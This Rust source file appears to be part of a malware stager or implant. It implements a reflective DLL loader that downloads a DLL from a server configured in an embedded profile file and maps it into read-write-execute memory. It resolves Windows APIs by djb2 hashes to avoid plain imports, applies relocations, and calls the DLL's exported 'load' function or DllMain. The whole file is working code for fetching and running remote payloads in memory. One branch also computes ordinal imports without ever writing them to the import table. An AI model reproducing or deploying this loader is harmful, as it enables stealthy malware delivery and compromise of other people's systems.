use alloc::collections::BTreeSet;
use alloc::vec::Vec;
use core::alloc::GlobalAlloc;
use core::ffi::{c_char, c_void, CStr};
use core::mem::{size_of, transmute};
use core::ptr::null_mut;
use core::slice;

use crate::core_link::bootstrapper::config::{DllDownloader, get_func_api, parse_toml};
use crate::core_link::bootstrapper::Instance::get_instance;
use crate::core_link::bootstrapper::types::{IMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW, IMAGE_SECTION_HEADER, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use crate::core_link::bootstrapper::utils::{hash_djb2, HASH_DLLMAIN, HASH_LOAD, HASH_LOAD_LIBRARY_A, HASH_NT_ALLOCATE_VIRTUAL_MEMORY};

use super::bootstrapper::types::{HANDLE, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR, IMAGE_NT_HEADERS, IMAGE_OPTIONAL_HEADER64, IMAGE_ORDINAL_FLAG64, IMAGE_THUNK_DATA64, LoadLibraryAFn, NtAllocateVirtualMemoryFn};

pub fn copy_headers_and_sections(
    dll_base: *const u8,
    base_address: *mut u8,
    option_header: &IMAGE_OPTIONAL_HEADER64,
    raw_nt_headers: *const IMAGE_NT_HEADERS,
) {
    unsafe {
        let size_of_headers = option_header.SizeOfHeaders as usize;
        // 将指针和长度转换为切片，并使用 copy_from_slice 进行复制
        {
            let src_slice = slice::from_raw_parts(dll_base, size_of_headers);
            let dst_slice = slice::from_raw_parts_mut(base_address, size_of_headers);
            dst_slice.copy_from_slice(src_slice);
        }
        // 计算节区头的起始地址
        let section_header = (raw_nt_headers as *const u8).add(size_of::<IMAGE_NT_HEADERS>()) as *const IMAGE_SECTION_HEADER;
        let section_num = (*raw_nt_headers).FileHeader.NumberOfSections as isize;
        for i in 0..section_num {
            let section = &*section_header.offset(i);
            let dst_ptr = base_address.add(section.VirtualAddress as usize);
            let source = dll_base.add(section.PointerToRawData as usize);
            core::ptr::copy_nonoverlapping(source, dst_ptr, section.SizeOfRawData as usize);
        }
    }
}

pub fn process_import_address_table(base_address: *mut u8, option_header: &IMAGE_OPTIONAL_HEADER64, load_library_a: LoadLibraryAFn) {
    unsafe {
        let import_dir = option_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
        let mut import_table = base_address.offset(import_dir.VirtualAddress as isize) as *mut IMAGE_IMPORT_DESCRIPTOR;
        while (*import_table).Name != 0 {
            let module_name_ptr = base_address.offset((*import_table).Name as isize) as *const c_char;
            let module_base = load_library_a(module_name_ptr);
            let mut INT = base_address.offset(*(*import_table).u.OriginalFirstThunk() as isize) as *const IMAGE_THUNK_DATA64;
            let mut IAT: *mut IMAGE_THUNK_DATA64 = base_address.offset((*import_table).FirstThunk as isize) as *mut IMAGE_THUNK_DATA64;
            while *(*IAT).u1.AddressOfData() != 0 {
                if ((*(*INT).u1.Ordinal() as u64) & IMAGE_ORDINAL_FLAG64 as u64) != 0 {
                    // 按序号导入
                    let lib_dos_header = module_base as *const IMAGE_DOS_HEADER;
                    let lib_nt_header = module_base.offset((*lib_dos_header).e_lfanew as isize) as *const IMAGE_NT_HEADERS;
                    let export_dir_entry = (*lib_nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress;
                    let export_va = module_base.offset(export_dir_entry as isize) as *const IMAGE_EXPORT_DIRECTORY;
                    let ordinal = ((*(*INT).u1.Ordinal() as u32) & 0xFFFF) as isize - (*export_va).Base as isize;
                    let array_addr = module_base.offset((*export_va).AddressOfFunctions as isize) as *const u32;
                    let func_rva = *array_addr.offset(ordinal);
                    let func_address = module_base.offset(func_rva as isize);
                } else {
                    // 按名称导入
                    let import_by_name = base_address.offset(*(*INT).u1.AddressOfData() as isize) as *const IMAGE_IMPORT_BY_NAME;
                    let func_name_ptr = (*import_by_name).Name.as_ptr();
                    let func_name_cstr = CStr::from_ptr(func_name_ptr).to_str().unwrap();
                    let func_address = get_func_api(module_base as *const c_void, hash_djb2(func_name_cstr));
                    if !func_address.is_null() {
                        let iat_entry = IAT as *mut u64;
                        *iat_entry = func_address as u64;
                    }
                }
                INT = INT.offset(1);
                IAT = IAT.offset(1);
            }
            import_table = import_table.offset(1);
        }
    }
}

pub fn apply_relocations(base_address: *mut u8, option_header: &IMAGE_OPTIONAL_HEADER64, region_size: usize) {
    unsafe {
        let delta = base_address as isize - option_header.ImageBase as isize;
        //println!("[*] Applying relocations with delta: {}", delta);
        // 重定位表
        let reloc_dir = option_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
        let mut reloc_block_ptr = base_address.offset(reloc_dir.VirtualAddress as isize) as *mut IMAGE_BASE_RELOCATION;

        let end_address = base_address.add(region_size);
        if reloc_block_ptr as usize >= end_address as usize {
            //println!("reloc_block超出了分配的内存范围");
        }
        let mut printed_entry_types = BTreeSet::new();
        while (*reloc_block_ptr).VirtualAddress != 0 {
            let total_size = (*reloc_block_ptr).SizeOfBlock as usize;
            let entry_count = (total_size - core::mem::size_of::<IMAGE_BASE_RELOCATION>()) / core::mem::size_of::<u16>();

            // 第一个重定位项紧跟在IMAGE_BASE_RELOCATION结构之后
            let first_reloc_entry_ptr = reloc_block_ptr.add(1) as *const u16;
            let mut reloc_entry_ptr = first_reloc_entry_ptr;

            for _ in 0..entry_count {
                let entry = *reloc_entry_ptr;
                let entry_type = entry >> 12;
                let offset = entry & 0xFFF;

                if !printed_entry_types.contains(&entry_type) {
                    printed_entry_types.insert(entry_type);
                }
                if entry_type == IMAGE_REL_BASED_HIGHLOW {
                    // 需要修正的实际地址
                    let patch_address_ptr = base_address.offset((*reloc_block_ptr).VirtualAddress as isize + offset as isize) as *mut u32;
                    // 应用修正
                    *patch_address_ptr = (*patch_address_ptr as isize + delta) as u32;
                }

                if entry_type == IMAGE_REL_BASED_DIR64 {
                    // 需要修正的实际地址，对于64位地址
                    let patch_address_ptr = base_address.offset((*reloc_block_ptr).VirtualAddress as isize + offset as isize) as *mut u64;
                    *patch_address_ptr = (*patch_address_ptr as isize + delta) as u64;
                }

                reloc_entry_ptr = reloc_entry_ptr.offset(1); // 移动到下一个重定位项
            }

            // 移动到下一个重定位块
            reloc_block_ptr = (reloc_block_ptr as *mut u8).add(total_size) as *mut IMAGE_BASE_RELOCATION;
        }
    };
}

pub fn load_dll() {
    const CONFIG: &str = include_str!("../../profile.config");
    let parsed_config = parse_toml(CONFIG);
    let ip = parsed_config.ip.unwrap();
    let path = parsed_config.path.unwrap();
    let mut downloader = DllDownloader {
        dll_data: Vec::new(),
    };
    let DLL_BYTES = downloader.get_request_dll(ip, path).unwrap();
    let dll_base = DLL_BYTES.as_ptr();
    let mut base_address: *mut c_void = null_mut();
    let raw_dos_header = dll_base as *const IMAGE_DOS_HEADER;
    let raw_nt_headers = unsafe { dll_base.offset((*raw_dos_header).e_lfanew as isize) } as *const IMAGE_NT_HEADERS;
    let option_header = unsafe { (*raw_nt_headers).OptionalHeader };
    let mut region_size = unsafe { option_header.SizeOfImage as usize };
    let ins = get_instance();
    let nt_allocate_virtual_memory: NtAllocateVirtualMemoryFn = unsafe {
        transmute(ins.win_api.funcs[&HASH_NT_ALLOCATE_VIRTUAL_MEMORY])
    };
    let status = unsafe {
        nt_allocate_virtual_memory(
            -1isize as HANDLE, // 使用当前进程
            &mut base_address,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    copy_headers_and_sections(dll_base, base_address as *mut u8, &option_header, raw_nt_headers);
    let loadlibrary_a: LoadLibraryAFn = unsafe { transmute(ins.win_api.funcs[&HASH_LOAD_LIBRARY_A]) };
    process_import_address_table(base_address as *mut u8, &option_header, loadlibrary_a);
    apply_relocations(base_address as *mut u8, &option_header, region_size);
    unsafe {
        let export_directory_rva = (*raw_nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress;
        let export_directory_va = base_address.offset(export_directory_rva as isize) as *const IMAGE_EXPORT_DIRECTORY;
        let count = (*export_directory_va).NumberOfNames;
        let names_rva = (*export_directory_va).AddressOfNames as isize;
        let names_va = base_address.offset(names_rva) as *const u32;
        let ordinals_rva = (*export_directory_va).AddressOfNameOrdinals as isize;
        let ordinals_va = base_address.offset(ordinals_rva) as *const u16;
        let addresses_rva = (*export_directory_va).AddressOfFunctions as isize;
        let addresses_va = base_address.offset(addresses_rva) as *const u32;
        for i in 0..count {
            let name_rva = *names_va.offset(i as isize);
            let name_va = base_address.offset(name_rva as isize) as *const i8;
            let func_name_cstr = CStr::from_ptr(name_va);
            if HASH_LOAD == hash_djb2(func_name_cstr.to_str().unwrap()) {
                let ordinal_index = *ordinals_va.offset(i as isize) as isize;
                let func_rva = *addresses_va.offset(ordinal_index);
                let func_va = base_address.offset(func_rva as isize);
                let load: extern "C" fn() = core::mem::transmute(func_va);
                load();
            } else if HASH_DLLMAIN == hash_djb2(func_name_cstr.to_str().unwrap()) {
                let ordinal_index = *ordinals_va.offset(i as isize) as isize;
                let func_rva = *addresses_va.offset(ordinal_index);
                let func_va = base_address.offset(func_rva as isize);
                type DllMainFunc = extern "system" fn(*mut c_void, u32, *mut c_void) -> bool;
                // 将函数地址转换为函数指针
                let dll_main: DllMainFunc = unsafe { core::mem::transmute(func_va) };
                let hinst_dll = base_address as *mut c_void; // 模块的基址
                let fdw_reason = 1u32; // 例如，DLL_PROCESS_ATTACH
                let lp_reserved = core::ptr::null_mut();
                let result = unsafe {
                    dll_main(hinst_dll, fdw_reason, lp_reserved)
                };
            }
        }
    }
}


